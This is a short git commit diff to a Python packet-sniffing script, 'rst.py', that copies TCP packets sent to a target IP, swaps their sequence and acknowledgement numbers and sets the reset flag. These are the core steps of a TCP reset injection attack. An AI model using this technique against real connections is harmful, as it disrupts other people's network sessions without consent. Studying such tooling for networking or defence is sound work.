3ad0c0f7c090691aaf75051ab9ece9e8577fc451
Samuel Wehunt <sam.wehunt@gmail.com>
2017-10-14 21:09:52 -0500

    added reset function

--- rst.py
+++ rst.py
@@ -6,6 +6,10 @@ def pkt_callback(packet):
     if (TCP in packet):
         if (packet[IP].dst == target_ip):
             resetPkt = packet
+            seq = packet[TCP].seq
+            ack = packet[TCP].ack
+            resetPkt[TCP].seq = ack
+            resetPkt[TCP].ack = seq
             resetPkt[TCP].flags = 'R'
             packet[TCP].show()
             resetPkt[TCP].show()
